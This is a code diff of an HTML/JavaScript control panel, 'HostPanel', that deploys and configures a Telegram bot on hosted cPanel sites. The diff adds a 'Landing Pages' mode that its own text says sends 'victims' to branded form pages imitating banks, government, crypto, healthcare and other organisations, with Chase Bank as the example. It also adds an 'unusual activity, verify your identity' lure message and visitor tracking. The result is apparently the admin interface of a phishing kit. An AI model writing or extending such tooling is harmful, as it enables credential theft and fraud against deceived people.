@@ -1,7 +1,7 @@
 <!doctype html>
 <html lang="en">
-<head>
-<meta charset="utf-8" />
+<head><meta charset="utf-8">
+
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>HostPanel</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -241,128 +241,124 @@
     </div>
 
     <div id="stab-botcontrol" class="hidden">
-      <div class="card">
-        <h2>🤖 Bot Control</h2>
-        <p class="hint">Deploy the download-redirect bot to this cPanel, configure tokens and settings, and access the bot dashboard in one click.</p>
+      <!-- Bot Control Sub-tabs -->
+      <div class="tabs" id="bc-tabs" style="margin-bottom:12px">
+        <div class="tab active" data-bctab="setup">⚙️ Setup</div>
+        <div class="tab" data-bctab="mode">🔀 Mode</div>
+        <div class="tab" data-bctab="landing" id="bc-tab-landing">🌐 Landing Pages</div>
+      </div>
 
-        <div style="margin-bottom:18px;padding:14px;background:rgba(0,212,255,0.04);border:1px solid rgba(0,212,255,0.15);border-radius:12px">
-          <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px">
-            <div>
-              <div style="font-weight:700;font-size:14px">Bot Deployment Status</div>
-              <div id="bc-status-text" style="font-size:12px;color:var(--ink3);margin-top:3px">Checking…</div>
-            </div>
-            <span id="bc-status-pill" class="pill" style="font-size:11px">…</span>
-          </div>
-        </div>
+      <!-- SETUP TAB -->
+      <div id="bctab-setup">
+        <div class="card">
+          <h2>🤖 Bot Control</h2>
+          <p class="hint">Deploy the download-redirect bot to this cPanel, configure tokens and settings, and access the bot dashboard in one click.</p>
 
-        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px">
-          <button id="bc-deploy" class="sm" style="margin:0">🚀 Deploy bot files</button>
-          <button id="bc-deploy-bridge" class="sm" style="margin:0;background:linear-gradient(135deg,#7c3aed,#4f46e5)">🌉 Deploy Bridge</button>
-          <button id="bc-dashboard" class="sm ghost" style="margin:0">📊 Open Dashboard →</button>
-        </div>
-
-        <div style="border-top:1px solid var(--line);padding-top:16px;margin-top:4px">
-          <div style="font-weight:700;font-size:13px;margin-bottom:12px">Telegram Bot Tokens</div>
-          <div class="row">
-            <div><label>Control Bot Token</label><input id="bc-ctrl-token" placeholder="bot token…" autocomplete="off" spellcheck="false"/></div>
-            <div><label>Visits Bot Token</label><input id="bc-vis-token" placeholder="bot token…" autocomplete="off" spellcheck="false"/></div>
-          </div>
-          <button id="bc-save-tokens" class="sm" style="margin-top:10px">💾 Save Tokens</button>
-        </div>
-
-        <div id="bc-config-section" class="hidden" style="border-top:1px solid var(--line);padding-top:16px;margin-top:16px">
-          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
-            <div style="font-weight:700;font-size:13px">Bot Settings</div>
-            <button id="bc-save-config" class="sm" style="margin:0">💾 Save Config</button>
-          </div>
-          <div class="row">
-            <div><label>Site URL</label><input id="bc-cfg-site-url" placeholder="https://yourdomain.com" autocomplete="off" spellcheck="false"/></div>
-            <div><label>Redirect Link (empty = use Site URL)</label><input id="bc-cfg-redirect" placeholder="https://bank.com/login" autocomplete="off" spellcheck="false"/></div>
-          </div>
-          <div class="row" style="margin-top:10px">
-            <div><label>Org Name (mobile page title)</label><input id="bc-cfg-bot-name" placeholder="Chase Bank" autocomplete="off" spellcheck="false"/></div>
-            <div><label>Admin Chat ID</label><input id="bc-cfg-admin-id" placeholder="123456789" inputmode="numeric" autocomplete="off"/></div>
-          </div>
-          <div class="row" style="margin-top:10px">
-            <div>
-              <label>Mobile Logo URL</label>
-              <div style="display:flex;gap:6px;align-items:center">
-                <input id="bc-cfg-logo" placeholder="https://logo.clearbit.com/chase.com" autocomplete="off" spellcheck="false" style="flex:1"/>
-                <img id="bc-logo-preview" src="" alt="" style="width:32px;height:32px;border-radius:6px;object-fit:contain;background:rgba(255,255,255,.08);border:1px solid var(--line);display:none;flex-shrink:0"/>
+          <div style="margin-bottom:18px;padding:14px;background:rgba(0,212,255,0.04);border:1px solid rgba(0,212,255,0.15);border-radius:12px">
+            <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px">
+              <div>
+                <div style="font-weight:700;font-size:14px">Bot Deployment Status</div>
+                <div id="bc-status-text" style="font-size:12px;color:var(--ink3);margin-top:3px">Checking…</div>
               </div>
-            </div>
-            <div>
-              <label>Mobile Color</label>
-              <div style="display:flex;gap:6px;align-items:center">
-                <input id="bc-cfg-color" placeholder="#003087" autocomplete="off" spellcheck="false" maxlength="7" style="flex:1"/>
-                <input type="color" id="bc-cfg-color-picker" style="width:36px;height:36px;border:1px solid var(--line);border-radius:6px;padding:2px;background:transparent;cursor:pointer;flex-shrink:0"/>
-              </div>
+              <span id="bc-status-pill" class="pill" style="font-size:11px">…</span>
             </div>
           </div>
+
+          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px">
+            <button id="bc-deploy-bridge" class="sm" style="margin:0;background:linear-gradient(135deg,#7c3aed,#4f46e5)">🌉 Deploy Bridge</button>
+            <button id="bc-dashboard" class="sm ghost" style="margin:0">📊 Open Dashboard →</button>
+          </div>
+
+          <div style="border-top:1px solid var(--line);padding-top:16px;margin-top:4px">
+            <div style="font-weight:700;font-size:13px;margin-bottom:12px">Telegram Bot Tokens</div>
+            <div class="row">
+              <div><label>Control Bot Token</label><input id="bc-ctrl-token" placeholder="bot token…" autocomplete="off" spellcheck="false"/></div>
+              <div><label>Visits Bot Token</label><input id="bc-vis-token" placeholder="bot token…" autocomplete="off" spellcheck="false"/></div>
+            </div>
+            <div style="margin-top:12px"><label>Admin Chat ID</label><input id="bc-admin-id" placeholder="123456789" inputmode="numeric" autocomplete="off"/></div>
+            <div style="margin-top:12px"><label>Site URL (full, e.g. https://casaisdeharo.com)</label><input id="bc-site-url" placeholder="https://yourdomain.com" autocomplete="off" spellcheck="false"/></div>
+            <button id="bc-save-tokens" class="sm" style="margin-top:10px">💾 Save Tokens &amp; Config</button>
+          </div>
+
+          <div id="bc-note" class="log hidden" style="margin-top:14px"></div>
+        </div>
+      </div>
+
+      <!-- MODE TAB -->
+      <div id="bctab-mode" class="hidden">
+        <div class="card">
+          <h2>🔀 Bot Mode</h2>
+          <p class="hint">Choose how the bot behaves when visitors interact with it.</p>
+
+          <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px" id="bc-mode-cards">
+            <div id="bc-mode-redirect" class="bc-mode-card" onclick="bcSelectMode('redirect')" style="flex:1;min-width:200px;border:2px solid var(--line);border-radius:14px;padding:18px;cursor:pointer;transition:all .2s">
+              <div style="font-size:22px;margin-bottom:8px">📥</div>
+              <div style="font-weight:700;font-size:14px">Redirect Mode</div>
+              <div style="font-size:12px;color:var(--ink3);margin-top:5px">Classic download bot. Visitors get a download link and redirect. Admin manages files and settings via Telegram.</div>
+              <div class="pill on" style="margin-top:10px;display:inline-flex" id="bc-mode-redirect-badge">Active</div>
+            </div>
+            <div id="bc-mode-landing" class="bc-mode-card" onclick="bcSelectMode('landing')" style="flex:1;min-width:200px;border:2px solid var(--line);border-radius:14px;padding:18px;cursor:pointer;transition:all .2s">
+              <div style="font-size:22px;margin-bottom:8px">🌐</div>
+              <div style="font-weight:700;font-size:14px">Landing Pages Mode</div>
+              <div style="font-size:12px;color:var(--ink3);margin-top:5px">Victims interact with the bot and get directed to professional form pages. Each preset = a separate branded page.</div>
+              <div class="pill off" style="margin-top:10px;display:inline-flex" id="bc-mode-landing-badge">Inactive</div>
+            </div>
+          </div>
+
+          <div style="border-top:1px solid var(--line);padding-top:16px">
+            <div style="font-weight:700;font-size:13px;margin-bottom:10px">Welcome Message (Landing mode)</div>
+            <div style="margin-bottom:10px"><label>Title</label><input id="bc-lp-title" placeholder="⚠️ Important Notice" autocomplete="off"/></div>
+            <div style="margin-bottom:10px"><label>Body text</label><textarea id="bc-lp-body" rows="3" style="width:100%;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:10px;color:var(--ink);padding:11px 14px;font-size:13px;font-family:var(--sans);resize:vertical" placeholder="We detected unusual activity on your account. Please verify your identity immediately to avoid service interruption."></textarea></div>
+            <button id="bc-save-mode" class="sm" style="margin:0">💾 Save Mode &amp; Welcome</button>
+          </div>
+          <div id="bc-mode-note" class="log hidden" style="margin-top:12px"></div>
+        </div>
+      </div>
+
+      <!-- LANDING PAGES TAB -->
+      <div id="bctab-landing" class="hidden">
+        <div class="card">
+          <h2>🌐 Landing Pages</h2>
+          <p class="hint">Add landing page presets for this site. Each preset becomes a button in the bot that sends victims to a branded form page.</p>
+
+          <div id="bc-lp-list" style="margin-bottom:16px"></div>
+
+          <div style="border-top:1px solid var(--line);padding-top:16px">
+            <div style="font-weight:700;font-size:13px;margin-bottom:10px">➕ Add Landing Page</div>
+            <div class="row">
+              <div><label>Preset ID</label><input id="bc-lp-pid" placeholder="e.g. chase_bank" autocomplete="off" spellcheck="false" oninput="bcLpPreview(this.value)"/></div>
+              <div><label>Button Label</label><input id="bc-lp-label" placeholder="e.g. 🏦 Chase Bank" autocomplete="off"/></div>
+            </div>
+            <div id="bc-lp-preview" style="margin-top:8px;font-size:12px;color:var(--ink3)"></div>
+            <button id="bc-lp-add" class="sm" style="margin-top:10px">➕ Add Page</button>
+          </div>
+          <div id="bc-lp-note" class="log hidden" style="margin-top:12px"></div>
         </div>
 
-        <!-- Live Visits Feed -->
-        <div id="bc-visits-section" class="hidden" style="border-top:1px solid var(--line);padding-top:16px;margin-top:16px">
-          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px">
-            <div style="font-weight:700;font-size:13px">Live Visits</div>
-            <button id="bc-refresh-visits" class="sm" style="margin:0">↻ Refresh</button>
+        <!-- Preset browser -->
+        <div class="card" style="margin-top:12px">
+          <h2>📋 Browse Presets</h2>
+          <p class="hint">Search available presets to add to this site.</p>
+          <div style="display:flex;gap:8px;margin-bottom:12px">
+            <input id="bc-preset-search" placeholder="Search preset ID or org name…" style="flex:1" oninput="bcPresetSearch(this.value)"/>
+            <select id="bc-preset-cat" style="width:160px" onchange="bcPresetSearch(document.getElementById('bc-preset-search').value)">
+              <option value="">All categories</option>
+              <option value="banking">Banking</option>
+              <option value="payment">Payment</option>
+              <option value="government">Government</option>
+              <option value="shipping">Shipping</option>
+              <option value="tech">Tech</option>
+              <option value="crypto">Crypto</option>
+              <option value="streaming">Streaming</option>
+              <option value="retail">Retail</option>
+              <option value="insurance">Insurance</option>
+              <option value="telecom">Telecom</option>
+              <option value="healthcare">Healthcare</option>
+              <option value="legal">Legal</option>
+            </select>
           </div>
-          <div id="bc-visits-stats" style="display:flex;gap:12px;margin-bottom:10px"></div>
-          <div id="bc-visits-table" style="overflow-x:auto;font-size:11px;max-height:220px;overflow-y:auto"></div>
+          <div id="bc-preset-results" style="max-height:320px;overflow-y:auto"></div>
         </div>
-
-        <!-- Landing Bot section -->
-        <div id="bc-landing-section" class="hidden" style="border-top:1px solid var(--line);padding-top:16px;margin-top:16px">
-          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
-            <div style="font-weight:700;font-size:13px">🎟 Landing Bot (Event Registration)</div>
-            <div style="display:flex;gap:6px">
-              <button id="bc-landing-registrants" class="sm" style="margin:0">👥 Registrants</button>
-              <button id="bc-landing-save" class="sm" style="margin:0">💾 Save</button>
-            </div>
-          </div>
-          <div class="row">
-            <div><label>Event Title</label><input id="lc-title" placeholder="Free Webinar: Digital Marketing 2025" autocomplete="off" spellcheck="false"/></div>
-            <div><label>Accent Color</label>
-              <div style="display:flex;gap:6px;align-items:center">
-                <input id="lc-accent" placeholder="#2563eb" maxlength="7" style="flex:1"/>
-                <input type="color" id="lc-accent-picker" style="width:36px;height:36px;border:1px solid var(--line);border-radius:6px;padding:2px;background:transparent;cursor:pointer;flex-shrink:0"/>
-              </div>
-            </div>
-          </div>
-          <div class="row" style="margin-top:8px">
-            <div><label>Event Date</label><input id="lc-date" placeholder="October 15, 2025" autocomplete="off"/></div>
-            <div><label>Event Time</label><input id="lc-time" placeholder="3:00 PM EST" autocomplete="off"/></div>
-          </div>
-          <div class="row" style="margin-top:8px">
-            <div><label>Host / Speaker</label><input id="lc-host" placeholder="John Smith" autocomplete="off"/></div>
-            <div><label>Logo URL</label><input id="lc-logo" placeholder="https://..." autocomplete="off"/></div>
-          </div>
-          <div style="margin-top:8px">
-            <label>Event Description</label>
-            <textarea id="lc-desc" rows="2" placeholder="Brief description of the event..." style="width:100%;background:rgba(255,255,255,.06);border:1px solid var(--line);border-radius:8px;color:var(--text);padding:10px 12px;font-size:13px;font-family:inherit;resize:vertical"></textarea>
-          </div>
-          <div style="margin-top:8px">
-            <label>Confirmation Message</label>
-            <input id="lc-confirm" placeholder="You're registered! Check your email for details." autocomplete="off"/>
-          </div>
-          <div style="margin-top:8px;display:flex;gap:16px">
-            <label style="display:flex;align-items:center;gap:6px;font-size:12px;cursor:pointer;text-transform:none;letter-spacing:0;color:var(--text)">
-              <input type="checkbox" id="lc-field-phone" style="width:14px;height:14px"> Show Phone field
-            </label>
-            <label style="display:flex;align-items:center;gap:6px;font-size:12px;cursor:pointer;text-transform:none;letter-spacing:0;color:var(--text)">
-              <input type="checkbox" id="lc-field-company" style="width:14px;height:14px"> Show Company field
-            </label>
-          </div>
-          <div id="bc-landing-registrants-panel" class="hidden" style="margin-top:12px;border-top:1px solid var(--line);padding-top:12px">
-            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
-              <div style="font-weight:600;font-size:12px">Registrants</div>
-              <a id="bc-landing-export" href="#" style="font-size:11px;color:var(--accent)">⬇ Export CSV</a>
-            </div>
-            <div id="bc-registrants-table" style="overflow-x:auto;font-size:11px;max-height:200px;overflow-y:auto"></div>
-          </div>
-        </div>
-
-        <div id="bc-note" class="log hidden" style="margin-top:14px"></div>
       </div>
     </div>
 
@@ -404,6 +400,15 @@
         <div class="toggle-row" style="border:0;padding-top:6px">
           <div><div class="t">Delete this cPanel</div><div class="d">Permanent. Removes the account, its files, and databases. Admin only.</div></div>
           <button class="sm danger" id="mg-delete">Delete</button>
+        </div>
+        <div id="mg-delete-confirm" class="hidden" style="margin-top:12px;background:rgba(255,60,60,.08);border:1px solid var(--crit);border-radius:8px;padding:14px">
+          <div style="color:var(--crit);font-weight:600;margin-bottom:8px">⚠ This will permanently delete the account and all its files.</div>
+          <div style="font-size:13px;margin-bottom:10px">Type the domain name to confirm:</div>
+          <input id="mg-delete-input" placeholder="e.g. example.com" style="width:100%;margin-bottom:10px;background:var(--bg);border:1px solid var(--crit);color:var(--text);padding:7px 10px;border-radius:6px;font-size:13px"/>
+          <div style="display:flex;gap:8px">
+            <button class="sm danger" id="mg-delete-confirm-btn">Yes, delete permanently</button>
+            <button class="sm" id="mg-delete-cancel-btn" style="background:var(--surface2)">Cancel</button>
+          </div>
         </div>
       </div>
       <div id="mg-note" class="log hidden"></div>
@@ -499,6 +504,27 @@ function showApp(){
   }
   if(isSuper) $("#ov-update-source").style.display="";
   fetch(API("status")).then(r=>r.json()).then(s=>{$("#s-whm").className="dot "+(s.whm?"up":"down");$("#s-cf").className="dot "+(s.cloudflare?"up":"down");});
+  // Deep-link: ?tab=botdash&cpuser=X → open that site's Bot Control directly
+  const _qp=new URLSearchParams(window.location.search);
+  if(_qp.get("tab")==="botdash"&&_qp.get("cpuser")){
+    const _cu=_qp.get("cpuser");
+    // Hook into loadSites to run after it finishes populating SITES
+    const _origLoadSites=loadSites;
+    window.loadSites=async function(){
+      await _origLoadSites.apply(this,arguments);
+      window.loadSites=_origLoadSites; // restore
+      const s=SITES.find(x=>x.user===_cu);
+      if(s){
+        openSite(s);
+        setTimeout(()=>{const bt=document.querySelector('#site-tabs .tab[data-stab="botcontrol"]');if(bt)bt.click();},300);
+      }
+    };
+    // Trigger My Sites tab
+    setTimeout(()=>{
+      const sitesTab=document.querySelector('#main-tabs .tab[data-tab="sites"]');
+      if(sitesTab) sitesTab.click();
+    },500);
+  }
 }
 $("#logout").onclick=async()=>{await fetch(API("logout"),{method:"POST"});location.reload();};
 
@@ -576,16 +602,10 @@ async function ovOpenCpanel(i,btn){
   btn.disabled=false;btn.textContent=old;
 }
 
-async function ovOpenBot(i,btn){
+function ovOpenBot(i,btn){
   const a=OV_ITEMS[i];
   if(!a.botDeployed){alert("Deploy the bot first — click the Deploy button.");return;}
-  btn.disabled=true;const old=btn.textContent;btn.textContent="Opening…";
-  const win=window.open("","_blank");
-  try{
-    const d=await (await fetch(API("bot_open_dashboard"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpanelUser:a.user,domain:a.domain})})).json();
-    if(d.ok&&win){win.location.href=d.direct_url||d.url;}else if(!d.ok){if(win)win.close();alert("✗ "+(d.error||"Failed"));}
-  }catch(e){if(win)win.close();alert("✗ "+e.message);}
-  btn.disabled=false;btn.textContent=old;
+  window.open("api.php?action=admin_dashboard&cpanelUser="+encodeURIComponent(a.user)+"&domain="+encodeURIComponent(a.domain),"_blank");
 }
 
 async function ovDeployBot(i,btn){
@@ -771,9 +791,18 @@ $("#mg-transfer").onclick=async()=>{
     if(d.ok){mgNote("✓ Transferred to "+esc(id)+".","ok");setTimeout(()=>{$("#site-back").click();loadSites();},1200);}else mgNote("✗ "+d.error,"err");
   }catch(e){mgNote("✗ "+e.message,"err");}
 };
-$("#mg-delete").onclick=async()=>{
-  if(!confirm("PERMANENTLY delete "+CURRENT.domain+" ("+CURRENT.user+")? This removes all files, email, and databases. Cannot be undone."))return;
-  if(!confirm("Are you absolutely sure? Type-check: this is irreversible."))return;
+$("#mg-delete").onclick=()=>{
+  $("#mg-delete-input").value="";
+  $("#mg-delete-confirm").classList.remove("hidden");
+  $("#mg-delete-input").focus();
+};
+$("#mg-delete-cancel-btn").onclick=()=>{
+  $("#mg-delete-confirm").classList.add("hidden");
+};
+$("#mg-delete-confirm-btn").onclick=async()=>{
+  const typed=$("#mg-delete-input").value.trim();
+  if(typed!==CURRENT.domain){mgNote("Domain name doesn't match. Type exactly: "+esc(CURRENT.domain),"err");return;}
+  $("#mg-delete-confirm").classList.add("hidden");
   mgNote("Deleting…");
   try{const d=await (await fetch(API("cpanel_terminate"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpanelUser:CURRENT.user})})).json();
     if(d.ok){mgNote("✓ Deleted.","ok");setTimeout(()=>{$("#site-back").click();loadSites();},1200);}else mgNote("✗ "+d.error,"err");
@@ -1144,6 +1173,18 @@ $("#u-audit").onclick=async()=>{
 };
 window.removeUser=async(chatId)=>{const d=await (await fetch(API("users_remove"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chatId})})).json();if(d.ok)loadUsers();else alert(d.error);};
 
+// --- Bot Control sub-tabs ---
+let _bcLpPages=[];
+document.querySelectorAll('#bc-tabs .tab').forEach(t=>{
+  t.onclick=()=>{
+    document.querySelectorAll('#bc-tabs .tab').forEach(x=>x.classList.remove('active'));
+    t.classList.add('active');
+    ['setup','mode','landing'].forEach(id=>document.getElementById('bctab-'+id).classList.add('hidden'));
+    document.getElementById('bctab-'+t.dataset.bctab).classList.remove('hidden');
+    if(t.dataset.bctab==='landing')bcLpRender();
+  };
+});
+
 // --- Bot Control tab ---
 async function loadBotControl(){
   const note=$("#bc-note");note.classList.add("hidden");note.innerHTML="";
@@ -1166,52 +1207,53 @@ async function loadBotControl(){
     statusPill.className="pill off";statusPill.textContent="Not deployed";statusText.textContent="Status check failed";
   }
 
-  // Load saved tokens (classic: bot_config_get via WHM)
+  // Load saved config (tokens + mode + lp_pages)
   try{
     const d=await (await fetch(API("bot_config_get")+"&cpanelUser="+encodeURIComponent(CURRENT.user)+"&domain="+encodeURIComponent(domain))).json();
     if(d.ok){
       $("#bc-ctrl-token").value=d.control_token||"";
       $("#bc-vis-token").value=d.visits_token||"";
-    }
-  }catch(_){}
-
-  // Load full config via bot_proxy → config_get (bridge mode only)
-  try{
-    const d=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({cpanelUser:CURRENT.user,domain,subaction:"config_get"})})).json();
-    if(d.ok&&d.config){
-      const c=d.config;
-      $("#bc-cfg-site-url").value  = c.site_url||"";
-      $("#bc-cfg-redirect").value  = c.redirect_link||"";
-      $("#bc-cfg-bot-name").value  = c.bot_name||"";
-      $("#bc-cfg-admin-id").value  = c.admin_chat_id||"";
-      const logo=c.mobile_logo||"";
-      const color=c.mobile_color||"";
-      $("#bc-cfg-logo").value  = logo;
-      $("#bc-cfg-color").value = color;
-      if(logo){$("#bc-logo-preview").src=logo;$("#bc-logo-preview").style.display="";}
-      if(/^#[0-9a-fA-F]{6}$/.test(color))$("#bc-cfg-color-picker").value=color;
-      $("#bc-config-section").classList.remove("hidden");
+      if(d.admin_chat_id) $("#bc-admin-id").value=d.admin_chat_id;
+      if(d.site_url) $("#bc-site-url").value=d.site_url;
+      // Mode tab
+      const mode=d.bot_mode||"redirect";
+      _bcSetModeUI(mode);
+      $("#bc-lp-title").value=d.lp_welcome_title||"";
+      $("#bc-lp-body").value=d.lp_welcome_body||"";
+      // LP pages
+      _bcLpPages=Array.isArray(d.lp_pages)?d.lp_pages:[];
     }
   }catch(_){}
 }
 
-function bcNote(html,cls){const n=$("#bc-note");n.classList.remove("hidden");n.innerHTML=`<span class="${cls||""}">${html}</span>`;}
+function _bcSetModeUI(mode){
+  const rc=document.getElementById("bc-mode-redirect"),lc=document.getElementById("bc-mode-landing");
+  const rb=document.getElementById("bc-mode-redirect-badge"),lb=document.getElementById("bc-mode-landing-badge");
+  if(!rc||!lc)return;
+  if(mode==="landing"){
+    lc.style.borderColor="var(--accent)";lc.style.background="rgba(0,212,255,0.06)";
+    rc.style.borderColor="var(--line)";rc.style.background="";
+    lb.className="pill on";lb.textContent="Active";
+    rb.className="pill off";rb.textContent="Inactive";
+    lc.dataset.selected="1";rc.dataset.selected="0";
+  }else{
+    rc.style.borderColor="var(--accent)";rc.style.background="rgba(0,212,255,0.06)";
+    lc.style.borderColor="var(--line)";lc.style.background="";
+    rb.className="pill on";rb.textContent="Active";
+    lb.className="pill off";lb.textContent="Inactive";
+    rc.dataset.selected="1";lc.dataset.selected="0";
+  }
+}
 
-$("#bc-deploy").onclick=async()=>{
-  const b=$("#bc-deploy");b.disabled=true;const old=b.textContent;b.textContent="Deploying…";
-  bcNote("Triggering bot deployment…");
-  try{
-    const d=await (await fetch(API("deploy_bot"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain})})).json();
-    if(d.ok){
-      const cnt=d.deployed?d.deployed.length:0;
-      const errTxt=d.errors&&d.errors.length?" ("+d.errors.length+" errors)":"";
-      bcNote("✓ "+cnt+" files deployed"+errTxt+".<br><a href='"+esc(d.url)+"' target='_blank'>"+esc(d.url)+"</a>","ok");
-      loadBotControl();
-    } else bcNote("✗ "+esc(d.error),"err");
-  }catch(e){bcNote("✗ "+esc(e.message),"err");}
-  b.disabled=false;b.textContent=old;
-};
+window.bcSelectMode=function(mode){_bcSetModeUI(mode);};
+
+function bcGetSelectedMode(){
+  return document.getElementById("bc-mode-landing").dataset.selected==="1"?"landing":"redirect";
+}
+
+function bcNote(html,cls){const n=$("#bc-note");n.classList.remove("hidden");n.innerHTML=`<span class="${cls||""}">${html}</span>`;}
+function bcModeNote(html,cls){const n=$("#bc-mode-note");n.classList.remove("hidden");n.innerHTML=`<span class="${cls||""}">${html}</span>`;}
+function bcLpNote(html,cls){const n=$("#bc-lp-note");n.classList.remove("hidden");n.innerHTML=`<span class="${cls||""}">${html}</span>`;}
 
 $("#bc-deploy-bridge").onclick=async()=>{
   const b=$("#bc-deploy-bridge");b.disabled=true;const old=b.textContent;b.textContent="Deploying…";
@@ -1226,199 +1268,143 @@ $("#bc-deploy-bridge").onclick=async()=>{
   b.disabled=false;b.textContent=old;
 };
 
-$("#bc-dashboard").onclick=async()=>{
+$("#bc-dashboard").onclick=()=>{
   if(!CURRENT)return;
-  const b=$("#bc-dashboard");b.disabled=true;b.textContent="Opening…";
-  const win=window.open("","_blank");
-  try{
-    const d=await (await fetch(API("bot_open_dashboard"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain})})).json();
-    if(d.ok&&win){win.location.href=d.direct_url||d.url;}else if(!d.ok){if(win)win.close();bcNote("✗ "+esc(d.error),"err");}
-  }catch(e){if(win)win.close();bcNote("✗ "+esc(e.message),"err");}
-  b.disabled=false;b.textContent="📊 Open Dashboard →";
+  const url="api.php?action=admin_dashboard&cpanelUser="+encodeURIComponent(CURRENT.user)+"&domain="+encodeURIComponent(CURRENT.domain);
+  window.open(url,"_blank");
 };
 
 $("#bc-save-tokens").onclick=async()=>{
   const ctrl=$("#bc-ctrl-token").value.trim(),vis=$("#bc-vis-token").value.trim();
-  bcNote("Saving tokens…");
+  const aid=$("#bc-admin-id").value.trim(),surl=$("#bc-site-url").value.trim();
+  bcNote("Saving…");
   try{
+    // Save tokens
     const d=await (await fetch(API("bot_config_save"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,control_token:ctrl,visits_token:vis})})).json();
-    if(d.ok) bcNote("✓ Tokens saved. "+esc(d.note||""),"ok");
-    else bcNote("✗ "+esc(d.error),"err");
-  }catch(e){bcNote("✗ "+esc(e.message),"err");}
-};
-
-$("#bc-save-config").onclick=async()=>{
-  const b=$("#bc-save-config");b.disabled=true;const old=b.textContent;b.textContent="Saving…";
-  const payload={
-    site_url:     $("#bc-cfg-site-url").value.trim(),
-    redirect_link:$("#bc-cfg-redirect").value.trim(),
-    bot_name:     $("#bc-cfg-bot-name").value.trim(),
-    admin_chat_id:$("#bc-cfg-admin-id").value.trim(),
-    mobile_logo:  $("#bc-cfg-logo").value.trim(),
-    mobile_color: $("#bc-cfg-color").value.trim(),
-  };
-  try{
-    const d=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,subaction:"config_save",...payload})})).json();
-    if(d.ok) bcNote("✓ Config saved.","ok");
-    else bcNote("✗ "+esc(d.error||d.msg||"Failed"),"err");
-  }catch(e){bcNote("✗ "+esc(e.message),"err");}
-  b.disabled=false;b.textContent=old;
-};
-
-// ── Color Picker sync ─────────────────────────────────────────────────────
-const colorInput=$("#bc-cfg-color"),colorPicker=$("#bc-cfg-color-picker");
-const logoInput=$("#bc-cfg-logo"),logoPreview=$("#bc-logo-preview");
-
-colorInput.oninput=()=>{
-  const v=colorInput.value.trim();
-  if(/^#[0-9a-fA-F]{6}$/.test(v)) colorPicker.value=v;
-};
-colorPicker.oninput=()=>{ colorInput.value=colorPicker.value; };
-
-logoInput.oninput=()=>{
-  const url=logoInput.value.trim();
-  if(url){
-    logoPreview.src=url;logoPreview.style.display="";
-    logoPreview.onerror=()=>logoPreview.style.display="none";
-  }else logoPreview.style.display="none";
-};
-
-// Landing accent picker sync
-const lcAccent=$("#lc-accent"),lcPicker=$("#lc-accent-picker");
-lcAccent.oninput=()=>{if(/^#[0-9a-fA-F]{6}$/.test(lcAccent.value.trim()))lcPicker.value=lcAccent.value.trim();};
-lcPicker.oninput=()=>{lcAccent.value=lcPicker.value;};
-
-// ── Live Visits Feed ───────────────────────────────────────────────────────
-async function loadVisits(){
-  if(!CURRENT)return;
-  const statsEl=$("#bc-visits-stats"),tableEl=$("#bc-visits-table");
-  statsEl.innerHTML="<span style='color:var(--dim);font-size:11px'>Loading…</span>";
-  tableEl.innerHTML="";
-  try{
-    const d=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,subaction:"visits_get",limit:50})})).json();
-    if(!d.ok){statsEl.innerHTML="<span style='color:var(--crit)'>"+esc(d.error||"Failed")+"</span>";return;}
-    const total=d.total||0,dls=d.downloads||0,visits=d.visits||[];
-    statsEl.innerHTML=`
-      <div style="background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:8px;padding:8px 14px;text-align:center;flex:1">
-        <div style="font-size:20px;font-weight:700;color:var(--accent)">${total}</div>
-        <div style="font-size:10px;color:var(--dim);margin-top:2px">Total Visits</div>
-      </div>
-      <div style="background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:8px;padding:8px 14px;text-align:center;flex:1">
-        <div style="font-size:20px;font-weight:700;color:#22c55e">${dls}</div>
-        <div style="font-size:10px;color:var(--dim);margin-top:2px">Downloads</div>
-      </div>
-      <div style="background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:8px;padding:8px 14px;text-align:center;flex:1">
-        <div style="font-size:20px;font-weight:700;color:#f59e0b">${visits.length}</div>
-        <div style="font-size:10px;color:var(--dim);margin-top:2px">Showing</div>
-      </div>`;
-    if(!visits.length){tableEl.innerHTML="<div style='color:var(--dim);font-size:11px;padding:8px'>No visits yet.</div>";return;}
-    const cols=["ip","browser","action","timestamp"];
-    tableEl.innerHTML=`<table style="width:100%;border-collapse:collapse">
-      <thead><tr>${cols.map(c=>`<th style="padding:5px 8px;text-align:left;border-bottom:1px solid var(--line);color:var(--dim);font-size:10px;text-transform:uppercase">${c}</th>`).join("")}</tr></thead>
-      <tbody>${visits.map(v=>`<tr style="border-bottom:1px solid rgba(255,255,255,.03)">${cols.map(c=>`<td style="padding:5px 8px;max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(String(v[c]||""))}</td>`).join("")}</tr>`).join("")}</tbody>
-    </table>`;
